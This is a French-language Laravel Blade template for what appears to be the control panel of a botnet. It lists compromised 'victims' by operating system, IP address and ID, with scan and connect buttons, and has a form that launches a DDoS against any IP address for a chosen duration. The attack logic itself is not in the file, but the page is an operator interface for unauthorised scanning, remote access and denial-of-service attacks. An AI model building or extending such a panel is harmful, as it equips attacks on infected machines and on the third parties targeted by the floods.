@extends("layouts.layout")

@section("title", "Accueil")

@section("content")
<section class="section">
    <div class="card mb-3">
        <div class="row g-0">
            <div class="col-md-4">
                <img src="{{ asset('images/' . $group->image) }}" class="img-fluid rounded-start" alt="{{ $group->name }}">
            </div>
            <div class="col-md-8">
                <div class="card-body">
                    <h1 class="card-title">{{ strtoupper($group->name) }}</h1>
                    <!-- Bordered Tabs Justified -->
                    <ul class="nav nav-tabs nav-tabs-bordered d-flex" id="borderedTabJustified" role="tablist">
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100 active" id="home-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-home" type="button" role="tab" aria-controls="home" aria-selected="true">Victimes</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="profile-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-profile" type="button" role="tab" aria-controls="profile" aria-selected="false">DDOS</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="contact-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-contact" type="button" role="tab" aria-controls="contact" aria-selected="false">Informations</button>
                        </li>
                    </ul>
                    @if(session('output'))
                        <div class="alert alert-info">{{ session('output') }}</div>
                    @endif
                    <div class="tab-content pt-2" id="borderedTabJustifiedContent">
                        <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
                            <table class="table">
                                <tbody>
                                    @foreach ($victims as $victim)
                                    <tr>
                                        <th scope="row">
                                            @if ($victim->os == "windows")
                                            <i class="bx bxl-windows"></i>
                                            @elseif ($victim->os == "linux")
                                            <i class="bx bxl-tux"></i>
                                            @elseif ($victim->os == "macos")
                                            <i class="bx bxl-apple"></i>
                                            @endif
                                        </th>
                                        <td>{{ $victim->ip }}</td>
                                        <td>{{ $victim->uid }}</td>
                                        <form method="POST" action="{{ route('network.scan') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-success">Scan</button></td>
                                        </form>
                                        <td><a class="btn btn-primary">Connexion</a></td>
                                    </tr>
                                    @endforeach
                                </tbody>
                            </table>
                        </div>
                        <div class="tab-pane fade" id="bordered-justified-profile" role="tabpanel" aria-labelledby="profile-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">DDOS</h5>
                                    <form method="POST" action="{{ route('network.ddos') }}">
                                        @csrf  <!-- N'oubliez pas le jeton CSRF pour la sécurité -->
                                        <div class="row mb-3">
                                            <label class="col-sm-2 col-form-label">ID Groupe</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="group_id" value="{{ $group->id }}" readonly>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <label class="col-sm-2 col-form-label">Nom groupe</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="group_name" value="{{ $group->name }}" readonly>
                                            </div>
                                        </div>
                                        <div class="mb-3 row">
                                            <label class="col-sm-2 col-form-label">Adresse IP</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="ip_address">
                                            </div>
                                        </div>
                                        <div class="mb-3 row">
                                            <label class="col-sm-2 col-form-label">Temps (en secondes)</label>
                                            <div class="col-sm-10">
                                                <input type="number" class="form-control" name="duration">
                                            </div>
                                        </div>
                                        <button type="submit" class="btn btn-success">Démarrer le DDOS</button>
                                    </form>
                                    <div class="credits">
                                        <br>
                                        Vous êtes responsable des conséquences que cet outil peut avoir sur les victimes.
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane fade" id="bordered-justified-contact" role="tabpanel" aria-labelledby="contact-tab">
                            <p>Créé le {{ $group->created_at }}</p>
                            <p><small class="text-muted">Dernière mise à jour le {{ $group->updated_at }}</small></p>
                            <form action="{{ route('network.destroy', $group->id) }}" method="POST">
                                @csrf
                                <button class="btn btn-danger" type="submit">Supprimer</button>
                            </form>
                        </div>
                    </div><!-- End Bordered Tabs Justified -->
                </div>
            </div>
        </div>
    </div>
</section>
@endsection
